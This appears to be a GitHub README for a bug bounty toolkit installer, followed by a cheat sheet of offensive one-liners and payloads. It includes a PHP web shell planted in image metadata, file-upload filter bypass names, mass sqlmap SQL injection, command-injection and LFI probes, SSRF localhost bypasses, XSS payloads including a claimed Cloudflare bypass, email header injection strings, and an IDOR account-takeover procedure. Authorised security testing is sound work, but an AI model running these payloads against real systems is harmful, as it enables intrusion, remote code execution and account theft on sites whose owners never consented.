# Awesome Bug Bounty Builder

[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/0xJin/awesome-bugbounty-builder/issues)


Awesome Bug bounty builder Project - ALL common Tools for find your Vulnerabilities.

**Tested on Debian.**


![bb](https://user-images.githubusercontent.com/81621963/147457586-79ac41eb-f995-455b-a144-f80a5783047a.PNG)


---

### Installation

```
$ git clone https://github.com/0xJin/awesome-bugbounty-builder.git
$ cd awesome-bugbounty-builder/
$ chmod +x awesome-bugbounty-builder.sh
$ ./awesome-bugbounty-builder.sh
```


### Which tools You will find here

> Amass -
> Sublister -
> Gauplus -
> httpx -
> gf + patterns -
> kxss -
> sqlmap -
> commix -
> tplmap -
> hydra -
> john the ripper -
> evilwinrm -
> Arjun -
> Paramspider -
> NoSQLmap -
> NMAP -
> nikto -
> FFUF -
> 403-Bypass -
> Gobuster -
> Seclists -
> Hash-identifier -
> XSSMAP -
> Smuggler -
> SSRFmap -
> gmapsapiscanner -
> qsreplace -
> exiftool -
> XSRFProbe 

---


### Bug Bounty TIPS and Usage of tools + One Liner TIPS


# ONE-LINER *RECON* for FUZZ XSS

```
$ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
$ cat domain.txt | gauplus -random-agent -t 200 | gf xss | kxss | tee domain2.txt
```

---


# FUZZ all SUBDOMAINS with *FUFF* ONE-LINER

```
$ amass enum -brute -passive -d http://example.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w wordlist.txt -u @/FUZZ -mc 200'
```

---


# COMMAND Injection with *FUFF* ONE-LINER

```
$ cat subdomains.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
$ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
// search for ”uid” in burp proxy intercept 
// You can use the same query for search SSTI in qsreplase add "{{7*7}}" and search on burp for '49'
```


---


# SQL Injection Tips

```
// MASS SQL injection
$ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
$ cat domain.txt | gauplus -random-agent -t 200 | gf sqli | tee domain2.txt
$ sqlmap -m domain2.txt -dbs --batch --random-agent
// SQL Injection headers:
$ sqlmap -u "http://redacted.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10
// SQL Injection bypass 401
$ sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-code=401
```

---


# XSS + SQLi + CSTI/SSTI

```
Payload: '"><svg/onload=prompt(5);>{{7*7}}
```


---


# EXIFTOOL + file UPLOAD Tips

```
$ exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
// File Upload bypass
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.
file.php....
file.pHp5....
file.png.php
file.png.pHp5
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
flile.phpJunk123png
file.png.jpg.php
file.php%00.png%00.jpg
```


---


# Open Redirect Tips ONE-LINER

```
$ export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```


---


# LFI ONE-LINER

```
$ gauplus -random-agent -t 200 http://redacted.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```


---


# Best SSRF Bypass

```
http://127.1/
http://0000::1:80/
http://[::]:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
```


---


# Email Header Injection 

```
$ "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example
.com
$ "recipient@test.com>\r\nRCPT TO:<victim+"@test
.com
```


---


# XSS Payload for Image

```
<img src=x onerror=alert('XSS')>.png
"><img src=x onerror=alert('XSS')>.png
"><svg onmouseover=alert(1)>.svg
<<script>alert('xss')<!--a-->a.png
```


---


# My XSS for bypass CLOUDFLARE with default rules

```
"/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
```


---


# Find hidden params in javascript files

```
$ amass enum -passive -brute -d redacted.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```


---


# IDOR to Account TakeOver quickly

```
~Create an account 
~In the reset field set a password and intercept with burp
~GET /user/2099/reset (change to 2098) send the request
~Take the token 
~Cookie editor and use this token
~Reload page
```


---


# For API-KEYS 

```
$ use gauplus and paramspider , after you can grep words like "api" or "key" and use gmapsapiscanner for see if is vulnerable.
```


### Thanks Follow me on Twitter

[@0xJin](https://twitter.com/0xJin) - This tool is made from 0xJin
